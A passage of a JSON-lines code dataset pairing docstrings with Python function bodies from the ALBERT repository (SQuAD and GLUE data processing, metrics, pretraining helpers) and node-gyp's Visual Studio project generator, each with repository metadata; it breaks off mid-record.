{"docstring": "\"\"\"Lower text and remove punctuation, articles and extra whitespace.\"\"\"\n", "func_signal": "def normalize_answer_v2(s):\n", "code": "def remove_articles(text):\n  regex = re.compile(r'\\b(a|an|the)\\b', re.UNICODE)\n  return re.sub(regex, ' ', text)\ndef white_space_fix(text):\n  return ' '.join(text.split())\ndef remove_punc(text):\n  exclude = set(string.punctuation)\n  return ''.join(ch for ch in text if ch not in exclude)\ndef lower(text):\n  return text.lower()\nreturn white_space_fix(remove_articles(remove_punc(lower(s))))", "path": "albert/squad_utils.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"Gathers the vectors at the specific positions over a minibatch.\"\"\"\n", "func_signal": "def gather_indexes(sequence_tensor, positions):\n", "code": "sequence_shape = modeling.get_shape_list(sequence_tensor, expected_rank=3)\nbatch_size = sequence_shape[0]\nseq_length = sequence_shape[1]\nwidth = sequence_shape[2]\n\nflat_offsets = tf.reshape(\n    tf.range(0, batch_size, dtype=tf.int32) * seq_length, [-1, 1])\nflat_positions = tf.reshape(positions + flat_offsets, [-1])\nflat_sequence_tensor = tf.reshape(sequence_tensor,\n                                  [batch_size * seq_length, width])\noutput_tensor = tf.gather(flat_sequence_tensor, flat_positions)\nreturn output_tensor", "path": "albert/run_pretraining.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"See base class.\"\"\"\n", "func_signal": "def get_test_examples(self, data_dir):\n", "code": "return self._create_examples(\n    self._read_tsv(os.path.join(data_dir, \"MRPC\", \"test.tsv\")), \"test\")", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"Creates examples for the training and dev sets.\"\"\"\n", "func_signal": "def _create_examples(self, lines, set_type):\n", "code": "examples = []\nfor (i, line) in enumerate(lines):\n  # Only the test set has a header\n  if set_type == \"test\" and i == 0:\n    continue\n  guid = \"%s-%s\" % (set_type, i)\n  if set_type == \"test\":\n    guid = line[0]\n    text_a = self.process_text(line[1])\n    label = \"0\"\n  else:\n    text_a = self.process_text(line[3])\n    label = self.process_text(line[1])\n  examples.append(\n      InputExample(guid=guid, text_a=text_a, text_b=None, label=label))\nreturn examples", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"See base class.\"\"\"\n", "func_signal": "def get_train_examples(self, data_dir):\n", "code": "return self._create_examples(\n    self._read_tsv(os.path.join(data_dir, \"CoLA\", \"train.tsv\")), \"train\")", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"Check if this is the 'max context' doc span for the token.\"\"\"\n\n# Because of the sliding window approach taken to scoring documents, a single\n# token can appear in multiple documents. E.g.\n#  Doc: the man went to the store and bought a gallon of milk\n#  Span A: the man went to the\n#  Span B: to the store and bought\n#  Span C: and bought a gallon of\n#  ...\n#\n# Now the word 'bought' will have two scores from spans B and C. We only\n# want to consider the score with \"maximum context\", which we define as\n# the *minimum* of its left and right context (the *sum* of left and\n# right context will always be the same, of course).\n#\n# In the example the maximum context for 'bought' would be span C since\n# it has 1 left context and 3 right context, while span B has 4 left context\n# and 0 right context.\n", "func_signal": "def _check_is_max_context(doc_spans, cur_span_index, position):\n", "code": "best_score = None\nbest_span_index = None\nfor (span_index, doc_span) in enumerate(doc_spans):\n  end = doc_span.start + doc_span.length - 1\n  if position < doc_span.start:\n    continue\n  if position > end:\n    continue\n  num_left_context = position - doc_span.start\n  num_right_context = end - position\n  score = min(num_left_context, num_right_context) + 0.01 * doc_span.length\n  if best_score is None or score > best_score:\n    best_score = score\n    best_span_index = span_index\n\nreturn cur_span_index == best_span_index", "path": "albert/squad_utils.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"Compute Matthew's correlations for COLA.\"\"\"\n", "func_signal": "def metric_fn(per_example_loss, label_ids, logits, is_real_example):\n", "code": "predictions = tf.argmax(logits, axis=-1, output_type=tf.int32)\n# https://en.wikipedia.org/wiki/Matthews_correlation_coefficient\ntp, tp_op = tf.metrics.true_positives(\n    labels=label_ids, predictions=predictions,\n    weights=is_real_example)\ntn, tn_op = tf.metrics.true_negatives(\n    labels=label_ids, predictions=predictions,\n    weights=is_real_example)\nfp, fp_op = tf.metrics.false_positives(\n    labels=label_ids, predictions=predictions,\n    weights=is_real_example)\nfn, fn_op = tf.metrics.false_negatives(\n    labels=label_ids, predictions=predictions,\n    weights=is_real_example)\n\n# Compute Matthew's correlation\nmcc = tf.div_no_nan(\n    tp * tn - fp * fn,\n    tf.pow((tp + fp) * (tp + fn) * (tn + fp) * (tn + fn), 0.5))\n\n# Compute accuracy\naccuracy = tf.metrics.accuracy(\n    labels=label_ids, predictions=predictions,\n    weights=is_real_example)\n\nloss = tf.metrics.mean(\n    values=per_example_loss,\n    weights=is_real_example)\n\nreturn {\"matthew_corr\": (mcc, tf.group(tp_op, tn_op, fp_op, fn_op)),\n        \"eval_accuracy\": accuracy, \"eval_loss\": loss,}", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"Compute softmax probability over raw logits.\"\"\"\n", "func_signal": "def _compute_softmax(scores):\n", "code": "if not scores:\n  return []\n\nmax_score = None\nfor score in scores:\n  if max_score is None or score > max_score:\n    max_score = score\n\nexp_scores = []\ntotal_sum = 0.0\nfor score in scores:\n  x = math.exp(score - max_score)\n  exp_scores.append(x)\n  total_sum += x\n\nprobs = []\nfor score in exp_scores:\n  probs.append(score / total_sum)\nreturn probs", "path": "albert/squad_utils.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"See base class.\"\"\"\n", "func_signal": "def get_test_examples(self, data_dir):\n", "code": "return self._create_examples(\n    self._read_tsv(os.path.join(data_dir, \"QNLI\", \"test.tsv\")),\n    \"test_matched\")", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"The actual input function.\"\"\"\n", "func_signal": "def input_fn(params):\n", "code": "if use_tpu:\n  batch_size = params[\"batch_size\"]\nelse:\n  batch_size = bsz\n\n# For training, we want a lot of parallel reading and shuffling.\n# For eval, we want no shuffling and parallel reading doesn't matter.\nd = tf.data.TFRecordDataset(input_file)\nif is_training:\n  d = d.repeat()\n  d = d.shuffle(buffer_size=100)\n\nd = d.apply(\n    contrib_data.map_and_batch(\n        lambda record: _decode_record(record, name_to_features),\n        batch_size=batch_size,\n        drop_remainder=drop_remainder))\n\nreturn d", "path": "albert/squad_utils.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"See base class.\"\"\"\n", "func_signal": "def get_test_examples(self, data_dir):\n", "code": "return self._create_examples(\n    self._read_tsv(os.path.join(data_dir, \"SST-2\", \"test.tsv\")), \"test\")", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"See base class.\"\"\"\n", "func_signal": "def get_dev_examples(self, data_dir):\n", "code": "return self._create_examples(\n    self._read_tsv(os.path.join(data_dir, \"STS-B\", \"dev.tsv\")), \"dev\")", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"Get loss and log probs for the next sentence prediction.\"\"\"\n\n# Simple binary classification. Note that 0 is \"next sentence\" and 1 is\n# \"random sentence\". This weight matrix is not used after pre-training.\n", "func_signal": "def get_sentence_order_output(albert_config, input_tensor, labels):\n", "code": "with tf.variable_scope(\"cls/seq_relationship\"):\n  output_weights = tf.get_variable(\n      \"output_weights\",\n      shape=[2, albert_config.hidden_size],\n      initializer=modeling.create_initializer(\n          albert_config.initializer_range))\n  output_bias = tf.get_variable(\n      \"output_bias\", shape=[2], initializer=tf.zeros_initializer())\n\n  logits = tf.matmul(input_tensor, output_weights, transpose_b=True)\n  logits = tf.nn.bias_add(logits, output_bias)\n  log_probs = tf.nn.log_softmax(logits, axis=-1)\n  labels = tf.reshape(labels, [-1])\n  one_hot_labels = tf.one_hot(labels, depth=2, dtype=tf.float32)\n  per_example_loss = -tf.reduce_sum(one_hot_labels * log_probs, axis=-1)\n  loss = tf.reduce_mean(per_example_loss)\n  return (loss, per_example_loss, log_probs)", "path": "albert/run_pretraining.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"See base class.\"\"\"\n", "func_signal": "def get_test_examples(self, data_dir):\n", "code": "return self._create_examples(\n    self._read_tsv(os.path.join(data_dir, \"MNLI\", \"test_mismatched.tsv\")),\n    \"test\")", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"Creates examples for the training and dev sets.\"\"\"\n", "func_signal": "def _create_examples(self, lines, set_type):\n", "code": "examples = []\nfor (i, line) in enumerate(lines):\n  if i == 0:\n    continue\n  guid = \"%s-%s\" % (set_type, i)\n  text_a = self.process_text(line[3])\n  text_b = self.process_text(line[4])\n  if set_type == \"test\":\n    guid = line[0]\n    label = \"0\"\n  else:\n    label = self.process_text(line[0])\n  examples.append(\n      InputExample(guid=guid, text_a=text_a, text_b=text_b, label=label))\nreturn examples", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"Longest-common-substring algorithm.\"\"\"\n", "func_signal": "def _lcs_match(max_dist, n=n, m=m):\n", "code": "f.fill(0)\ng.clear()\n\n### longest common sub sequence\n# f[i, j] = max(f[i - 1, j], f[i, j - 1], f[i - 1, j - 1] + match(i, j))\nfor i in range(n):\n\n  # note(zhiliny):\n  # unlike standard LCS, this is specifically optimized for the setting\n  # because the mismatch between sentence pieces and original text will\n  # be small\n  for j in range(i - max_dist, i + max_dist):\n    if j >= m or j < 0: continue\n\n    if i > 0:\n      g[(i, j)] = 0\n      f[i, j] = f[i - 1, j]\n\n    if j > 0 and f[i, j - 1] > f[i, j]:\n      g[(i, j)] = 1\n      f[i, j] = f[i, j - 1]\n\n    f_prev = f[i - 1, j - 1] if i > 0 and j > 0 else 0\n    if (tokenization.preprocess_text(\n        paragraph_text[i], lower=do_lower_case,\n        remove_space=False) == tok_cat_text[j]\n        and f_prev + 1 > f[i, j]):\n      g[(i, j)] = 2\n      f[i, j] = f_prev + 1", "path": "albert/squad_utils.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"See base class.\"\"\"\n", "func_signal": "def get_dev_examples(self, data_dir):\n", "code": "return self._create_examples(\n    self._read_tsv(os.path.join(data_dir, \"MRPC\", \"dev.tsv\")), \"dev\")", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"See base class.\"\"\"\n", "func_signal": "def get_dev_examples(self, data_dir):\n", "code": "return self._create_examples(\n    self._read_tsv(os.path.join(data_dir, \"QNLI\", \"dev.tsv\")),\n    \"dev_matched\")", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"Creates examples for the training and dev sets.\"\"\"\n", "func_signal": "def _create_examples(self, lines, set_type):\n", "code": "examples = []\nfor (i, line) in enumerate(lines):\n  if i == 0:\n    continue\n  if set_type != \"test\":\n    guid = \"%s-%s\" % (set_type, i)\n    text_a = self.process_text(line[0])\n    label = self.process_text(line[1])\n  else:\n    guid = self.process_text(line[0])\n    # guid = \"%s-%s\" % (set_type, line[0])\n    text_a = self.process_text(line[1])\n    label = \"0\"\n  examples.append(\n      InputExample(guid=guid, text_a=text_a, text_b=None, label=label))\nreturn examples", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"See base class.\"\"\"\n", "func_signal": "def get_dev_examples(self, data_dir):\n", "code": "return self._create_examples(\n    self._read_tsv(os.path.join(data_dir, \"SST-2\", \"dev.tsv\")), \"dev\")", "path": "albert/classifier_utils.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "google-research/albert", "stars": 3191, "license": "apache-2.0", "language": "python", "size": 296}
{"docstring": "\"\"\"Returns the list of directories to be used for #include directives.\n\nArguments:\n  config: The dictionary that defines the special processing to be done\n          for this configuration.\nReturns:\n  The list of directory paths.\n\"\"\"\n# TODO(bradnelson): include_dirs should really be flexible enough not to\n#                   require this sort of thing.\n", "func_signal": "def _GetIncludeDirs(config):\n", "code": "include_dirs = (\n    config.get('include_dirs', []) +\n    config.get('msvs_system_include_dirs', []))\nmidl_include_dirs = (\n    config.get('midl_include_dirs', []) +\n    config.get('msvs_system_include_dirs', []))\nresource_include_dirs = config.get('resource_include_dirs', include_dirs)\ninclude_dirs = _FixPaths(include_dirs)\nmidl_include_dirs = _FixPaths(midl_include_dirs)\nresource_include_dirs = _FixPaths(resource_include_dirs)\nreturn include_dirs, midl_include_dirs, resource_include_dirs", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Escapes % characters.\n\nEscapes any % characters so that Windows-style environment variable\nexpansions will leave them alone.\nSee http://connect.microsoft.com/VisualStudio/feedback/details/106127/cl-d-name-text-containing-percentage-characters-doesnt-compile\nto understand why we have to do this.\n\nArgs:\n    s: The string to be escaped.\n\nReturns:\n    The escaped string.\n\"\"\"\n", "func_signal": "def _EscapeEnvironmentVariableExpansion(s):\n", "code": "s = s.replace('%', '%%')\nreturn s", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "# Convert to folders recursively.\n", "func_signal": "def _DictsToFolders(base_path, bucket, flat):\n", "code": "children = []\nfor folder, contents in bucket.iteritems():\n  if type(contents) == dict:\n    folder_children = _DictsToFolders(os.path.join(base_path, folder),\n                                      contents, flat)\n    if flat:\n      children += folder_children\n    else:\n      folder_children = MSVSNew.MSVSFolder(os.path.join(base_path, folder),\n                                           name='(' + folder + ')',\n                                           entries=folder_children)\n      children.append(folder_children)\n  else:\n    children.append(contents)\nreturn children", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Makes sure if duplicate basenames are not specified in the source list.\n\nArguments:\n  spec: The target dictionary containing the properties of the target.\n  version: The VisualStudioVersion object.\n\"\"\"\n# This validation should not be applied to MSVC2010 and later.\n", "func_signal": "def _ValidateSourcesForMSVSProject(spec, version):\n", "code": "assert not version.UsesVcxproj()\n\n# TODO: Check if MSVC allows this for loadable_module targets.\nif spec.get('type', None) not in ('static_library', 'shared_library'):\n  return\nsources = spec.get('sources', [])\nbasenames = {}\nfor source in sources:\n  name, ext = os.path.splitext(source)\n  is_compiled_file = ext in [\n      '.c', '.cc', '.cpp', '.cxx', '.m', '.mm', '.s', '.S']\n  if not is_compiled_file:\n    continue\n  basename = os.path.basename(name)  # Don't include extension.\n  basenames.setdefault(basename, []).append(source)\n\nerror = ''\nfor basename, files in basenames.iteritems():\n  if len(files) > 1:\n    error += '  %s: %s\\n' % (basename, ' '.join(files))\n\nif error:\n  print('static library %s has several files with the same basename:\\n' %\n        spec['target_name'] + error + 'MSVC08 cannot handle that.')\n  raise GypError('Duplicate basenames in sources section, see list above')", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Add a suffix to the end of a target.\n\nArguments:\n  name: name of the target (foo#target)\n  suffix: the suffix to be added\nReturns:\n  Target name with suffix added (foo_suffix#target)\n\"\"\"\n", "func_signal": "def _SuffixName(name, suffix):\n", "code": "parts = name.rsplit('#', 1)\nparts[0] = '%s_%s' % (parts[0], suffix)\nreturn '#'.join(parts)", "path": "StarsAndClown/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/MSVSUtil.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Initialize targets for the ninja flavor.\n\nThis sets up the necessary variables in the targets to generate msvs projects\nthat use ninja as an external builder. The variables in the spec are only set\nif they have not been set. This allows individual specs to override the\ndefault values initialized here.\nArguments:\n  params: Params provided to the generator.\n  target_list: List of target pairs: 'base/base.gyp:base'.\n  target_dicts: Dict of target properties keyed on target pair.\n\"\"\"\n", "func_signal": "def _InitNinjaFlavor(params, target_list, target_dicts):\n", "code": "for qualified_target in target_list:\n  spec = target_dicts[qualified_target]\n  if spec.get('msvs_external_builder'):\n    # The spec explicitly defined an external builder, so don't change it.\n    continue\n\n  path_to_ninja = spec.get('msvs_path_to_ninja', 'ninja.exe')\n\n  spec['msvs_external_builder'] = 'ninja'\n  if not spec.get('msvs_external_builder_out_dir'):\n    gyp_file, _, _ = gyp.common.ParseQualifiedTarget(qualified_target)\n    gyp_dir = os.path.dirname(gyp_file)\n    configuration = '$(Configuration)'\n    if params.get('target_arch') == 'x64':\n      configuration += '_x64'\n    spec['msvs_external_builder_out_dir'] = os.path.join(\n        gyp.common.RelativePath(params['options'].toplevel_dir, gyp_dir),\n        ninja_generator.ComputeOutputDir(params),\n        configuration)\n  if not spec.get('msvs_external_builder_build_cmd'):\n    spec['msvs_external_builder_build_cmd'] = [\n      path_to_ninja,\n      '-C',\n      '$(OutDir)',\n      '$(ProjectName)',\n    ]\n  if not spec.get('msvs_external_builder_clean_cmd'):\n    spec['msvs_external_builder_clean_cmd'] = [\n      path_to_ninja,\n      '-C',\n      '$(OutDir)',\n      '-tclean',\n      '$(ProjectName)',\n    ]", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Generates a .vcproj file.  It may create .rules and .user files too.\n\nArguments:\n  project: The project object we will generate the file for.\n  options: Global options passed to the generator.\n  version: The VisualStudioVersion object.\n  generator_flags: dict of generator-specific flags.\n\"\"\"\n", "func_signal": "def _GenerateMSVSProject(project, options, version, generator_flags):\n", "code": "spec = project.spec\ngyp.common.EnsureDirExists(project.path)\n\nplatforms = _GetUniquePlatforms(spec)\np = MSVSProject.Writer(project.path, version, spec['target_name'],\n                       project.guid, platforms)\n\n# Get directory project file is in.\nproject_dir = os.path.split(project.path)[0]\ngyp_path = _NormalizedSource(project.build_file)\nrelative_path_of_gyp_file = gyp.common.RelativePath(gyp_path, project_dir)\n\nconfig_type = _GetMSVSConfigurationType(spec, project.build_file)\nfor config_name, config in spec['configurations'].iteritems():\n  _AddConfigurationToMSVSProject(p, spec, config_type, config_name, config)\n\n# MSVC08 and prior version cannot handle duplicate basenames in the same\n# target.\n# TODO: Take excluded sources into consideration if possible.\n_ValidateSourcesForMSVSProject(spec, version)\n\n# Prepare list of sources and excluded sources.\ngyp_file = os.path.split(project.build_file)[1]\nsources, excluded_sources = _PrepareListOfSources(spec, generator_flags,\n                                                  gyp_file)\n\n# Add rules.\nactions_to_add = {}\n_GenerateRulesForMSVS(p, project_dir, options, spec,\n                      sources, excluded_sources,\n                      actions_to_add)\nlist_excluded = generator_flags.get('msvs_list_excluded_files', True)\nsources, excluded_sources, excluded_idl = (\n    _AdjustSourcesAndConvertToFilterHierarchy(spec, options, project_dir,\n                                              sources, excluded_sources,\n                                              list_excluded, version))\n\n# Add in files.\nmissing_sources = _VerifySourcesExist(sources, project_dir)\np.AddFiles(sources)\n\n_AddToolFilesToMSVS(p, spec)\n_HandlePreCompiledHeaders(p, sources, spec)\n_AddActions(actions_to_add, spec, relative_path_of_gyp_file)\n_AddCopies(actions_to_add, spec)\n_WriteMSVSUserFile(project.path, version, spec)\n\n# NOTE: this stanza must appear after all actions have been decided.\n# Don't excluded sources with actions attached, or they won't run.\nexcluded_sources = _FilterActionsFromExcluded(\n    excluded_sources, actions_to_add)\n_ExcludeFilesFromBeingBuilt(p, spec, excluded_sources, excluded_idl,\n                            list_excluded)\n_AddAccumulatedActionsToMSVS(p, spec, actions_to_add)\n\n# Write it out.\np.WriteIfChanged()\n\nreturn missing_sources", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Get the guid for the project.\n\nArguments:\n  proj_path: Path of the vcproj or vcxproj file to generate.\n  spec: The target dictionary containing the properties of the target.\nReturns:\n  the guid.\nRaises:\n  ValueError: if the specified GUID is invalid.\n\"\"\"\n# Pluck out the default configuration.\n", "func_signal": "def _GetGuidOfProject(proj_path, spec):\n", "code": "default_config = _GetDefaultConfiguration(spec)\n# Decide the guid of the project.\nguid = default_config.get('msvs_guid')\nif guid:\n  if VALID_MSVS_GUID_CHARS.match(guid) is None:\n    raise ValueError('Invalid MSVS guid: \"%s\".  Must match regex: \"%s\".' %\n                     (guid, VALID_MSVS_GUID_CHARS.pattern))\n  guid = '{%s}' % guid\nguid = guid or MSVSNew.MakeGuid(proj_path)\nreturn guid", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "# |path| will eventually be empty (in the recursive calls) if it was initially\n# relative; otherwise it will eventually end up as '\\', 'D:\\', etc.\n", "func_signal": "def _GetPathDict(root, path):\n", "code": "if not path or path.endswith(os.sep):\n  return root\nparent, folder = os.path.split(path)\nparent_dict = _GetPathDict(root, parent)\nif folder not in parent_dict:\n  parent_dict[folder] = dict()\nreturn parent_dict[folder]", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Take inputs with actions attached out of the list of exclusions.\n\nArguments:\n  excluded_sources: list of source files not to be built.\n  actions_to_add: dict of actions keyed on source file they're attached to.\nReturns:\n  excluded_sources with files that have actions attached removed.\n\"\"\"\n", "func_signal": "def _FilterActionsFromExcluded(excluded_sources, actions_to_add):\n", "code": "must_keep = OrderedSet(_FixPaths(actions_to_add.keys()))\nreturn [s for s in excluded_sources if s not in must_keep]", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Generate the .targets file.\"\"\"\n", "func_signal": "def _GenerateMSBuildRuleTargetsFile(targets_path, msbuild_rules):\n", "code": "content = ['Project',\n           {'xmlns': 'http://schemas.microsoft.com/developer/msbuild/2003'\n           }\n          ]\nitem_group = [\n    'ItemGroup',\n    ['PropertyPageSchema',\n     {'Include': '$(MSBuildThisFileDirectory)$(MSBuildThisFileName).xml'}\n    ]\n  ]\nfor rule in msbuild_rules:\n  item_group.append(\n      ['AvailableItemName',\n       {'Include': rule.rule_name},\n       ['Targets', rule.target_name],\n      ])\ncontent.append(item_group)\n\nfor rule in msbuild_rules:\n  content.append(\n      ['UsingTask',\n       {'TaskName': rule.rule_name,\n        'TaskFactory': 'XamlTaskFactory',\n        'AssemblyName': 'Microsoft.Build.Tasks.v4.0'\n       },\n       ['Task', '$(MSBuildThisFileDirectory)$(MSBuildThisFileName).xml'],\n      ])\nfor rule in msbuild_rules:\n  rule_name = rule.rule_name\n  target_outputs = '%%(%s.Outputs)' % rule_name\n  target_inputs = ('%%(%s.Identity);%%(%s.AdditionalDependencies);'\n                   '$(MSBuildProjectFile)') % (rule_name, rule_name)\n  rule_inputs = '%%(%s.Identity)' % rule_name\n  extension_condition = (\"'%(Extension)'=='.obj' or \"\n                         \"'%(Extension)'=='.res' or \"\n                         \"'%(Extension)'=='.rsc' or \"\n                         \"'%(Extension)'=='.lib'\")\n  remove_section = [\n      'ItemGroup',\n      {'Condition': \"'@(SelectedFiles)' != ''\"},\n      [rule_name,\n       {'Remove': '@(%s)' % rule_name,\n        'Condition': \"'%(Identity)' != '@(SelectedFiles)'\"\n       }\n      ]\n  ]\n  inputs_section = [\n      'ItemGroup',\n      [rule.inputs, {'Include': '%%(%s.AdditionalDependencies)' % rule_name}]\n  ]\n  logging_section = [\n      'ItemGroup',\n      [rule.tlog,\n       {'Include': '%%(%s.Outputs)' % rule_name,\n        'Condition': (\"'%%(%s.Outputs)' != '' and \"\n                      \"'%%(%s.ExcludedFromBuild)' != 'true'\" %\n                      (rule_name, rule_name))\n       },\n       ['Source', \"@(%s, '|')\" % rule_name],\n       ['Inputs', \"@(%s -> '%%(Fullpath)', ';')\" % rule.inputs],\n      ],\n  ]\n  message_section = [\n      'Message',\n      {'Importance': 'High',\n       'Text': '%%(%s.ExecutionDescription)' % rule_name\n      }\n  ]\n  write_tlog_section = [\n      'WriteLinesToFile',\n      {'Condition': \"'@(%s)' != '' and '%%(%s.ExcludedFromBuild)' != \"\n       \"'true'\" % (rule.tlog, rule.tlog),\n       'File': '$(IntDir)$(ProjectName).write.1.tlog',\n       'Lines': \"^%%(%s.Source);@(%s->'%%(Fullpath)')\" % (rule.tlog,\n                                                          rule.tlog)\n      }\n  ]\n  read_tlog_section = [\n      'WriteLinesToFile',\n      {'Condition': \"'@(%s)' != '' and '%%(%s.ExcludedFromBuild)' != \"\n       \"'true'\" % (rule.tlog, rule.tlog),\n       'File': '$(IntDir)$(ProjectName).read.1.tlog',\n       'Lines': \"^%%(%s.Source);%%(%s.Inputs)\" % (rule.tlog, rule.tlog)\n      }\n  ]\n  command_and_input_section = [\n      rule_name,\n      {'Condition': \"'@(%s)' != '' and '%%(%s.ExcludedFromBuild)' != \"\n       \"'true'\" % (rule_name, rule_name),\n       'EchoOff': 'true',\n       'StandardOutputImportance': 'High',\n       'StandardErrorImportance': 'High',\n       'CommandLineTemplate': '%%(%s.CommandLineTemplate)' % rule_name,\n       'AdditionalOptions': '%%(%s.AdditionalOptions)' % rule_name,\n       'Inputs': rule_inputs\n      }\n  ]\n  content.extend([\n      ['Target',\n       {'Name': rule.target_name,\n        'BeforeTargets': '$(%s)' % rule.before_targets,\n        'AfterTargets': '$(%s)' % rule.after_targets,\n        'Condition': \"'@(%s)' != ''\" % rule_name,\n        'DependsOnTargets': '$(%s);%s' % (rule.depends_on,\n                                          rule.compute_output),\n        'Outputs': target_outputs,\n        'Inputs': target_inputs\n       },\n       remove_section,\n       inputs_section,\n       logging_section,\n       message_section,\n       write_tlog_section,\n       read_tlog_section,\n       command_and_input_section,\n      ],\n      ['PropertyGroup',\n       ['ComputeLinkInputsTargets',\n        '$(ComputeLinkInputsTargets);',\n        '%s;' % rule.compute_output\n       ],\n       ['ComputeLibInputsTargets',\n        '$(ComputeLibInputsTargets);',\n        '%s;' % rule.compute_output\n       ],\n      ],\n      ['Target',\n       {'Name': rule.compute_output,\n        'Condition': \"'@(%s)' != ''\" % rule_name\n       },\n       ['ItemGroup',\n        [rule.dirs_to_make,\n         {'Condition': \"'@(%s)' != '' and \"\n          \"'%%(%s.ExcludedFromBuild)' != 'true'\" % (rule_name, rule_name),\n          'Include': '%%(%s.Outputs)' % rule_name\n         }\n        ],\n        ['Link',\n         {'Include': 